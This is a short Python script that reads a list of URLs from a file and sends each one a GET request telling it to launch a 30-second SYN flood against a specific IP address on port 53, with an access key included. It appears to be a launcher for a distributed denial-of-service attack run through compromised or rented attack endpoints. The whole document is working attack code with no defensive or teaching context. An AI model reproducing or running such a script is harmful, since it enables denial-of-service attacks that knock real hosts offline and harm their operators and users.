import requests

urls = [x.strip() for x in open('done.txt').readlines()]

target = "185.200.233.218"
port = 53
key = "etherealhehe"
time = 30

for url in urls:
    r_url = url + \
        f"?host={target}&port={port}&time={time}&key={key}&method=syn"
    requests.get(r_url)
    print(url + " done...")
